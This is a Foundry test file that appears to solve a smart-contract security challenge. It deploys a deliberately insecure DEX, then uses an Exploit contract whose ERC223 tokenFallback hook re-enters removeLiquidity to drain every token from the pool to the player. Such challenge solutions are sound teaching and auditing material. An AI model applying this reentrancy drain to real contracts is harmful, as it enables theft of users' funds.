// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {InSecureumToken} from "../src/tokens/tokenInsecureum.sol";

import {SimpleERC223Token} from "../src/tokens/tokenERC223.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {InsecureDexLP} from "../src/Challenge2.DEX.sol";


contract Challenge2Test is Test {
    InsecureDexLP target; 
    IERC20 token0;
    IERC20 token1;

    address player = makeAddr("player");

    function setUp() public {
        address deployer = makeAddr("deployer");
        vm.startPrank(deployer);
        token0 = IERC20(new InSecureumToken(10 ether));
        token1 = IERC20(new SimpleERC223Token(10 ether));
        
        target = new InsecureDexLP(address(token0),address(token1));

        token0.approve(address(target), type(uint256).max);
        token1.approve(address(target), type(uint256).max);
        target.addLiquidity(9 ether, 9 ether);

        token0.transfer(player, 1 ether);
        token1.transfer(player, 1 ether);
        vm.stopPrank();

        vm.label(address(target), "DEX");
        vm.label(address(token0), "InSecureumToken");
        vm.label(address(token1), "SimpleERC223Token");
    }

    function testChallenge2() public {  
        /*//////////////////////////////
        //    Add your hack below!    //
        //////////////////////////////*/
        Exploit exp = new Exploit(target, token0, token1, player);
        
        vm.startPrank(player);

        token0.transfer(address(exp), 1 ether);
        token1.transfer(address(exp), 1 ether);

        exp.bypassLiquidityCheck();
        exp.doTheMagic();
        exp.steal();

        vm.stopPrank();

        /*////////////////////////////*/

        assertEq(token0.balanceOf(player), 10 ether, "Player should have 10 ether of token0");
        assertEq(token1.balanceOf(player), 10 ether, "Player should have 10 ether of token1");
        assertEq(token0.balanceOf(address(target)), 0, "Dex should be empty (token0)");
        assertEq(token1.balanceOf(address(target)), 0, "Dex should be empty (token1)");
    }
}

/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
////////////////////////////////////////////////////////////*/


contract Exploit {
    IERC20 public token0; // this is insecureumToken
    IERC20 public token1; // this is simpleERC223Token
    InsecureDexLP public dex;
    address owner;
    
    bool initialized = false;
    bool hacked = false;

    constructor(InsecureDexLP _target, IERC20 _token0, IERC20 _token1, address _player){
        token0 = _token0;
        token1 = _token1;
        dex = _target;
        owner = _player;
    }

    function bypassLiquidityCheck() public {
        token0.approve(address(dex), type(uint256).max);
        token1.approve(address(dex), type(uint256).max);
        dex.addLiquidity(1 wei, 1 wei);
        initialized = true;
    }

    function doTheMagic() public {
        dex.removeLiquidity(1 wei);
    }

    function steal() public {
        dex.removeLiquidity(dex.totalSupply());
        token0.transfer(owner, token0.balanceOf(address(this)));
        token1.transfer(owner, token1.balanceOf(address(this)));
    }

    function tokenFallback(address, uint256, bytes memory ) external {
        console.log("token fallback");
        if(initialized && !hacked){
            hacked = true;
            dex.removeLiquidity(1 wei);
        }
    }
}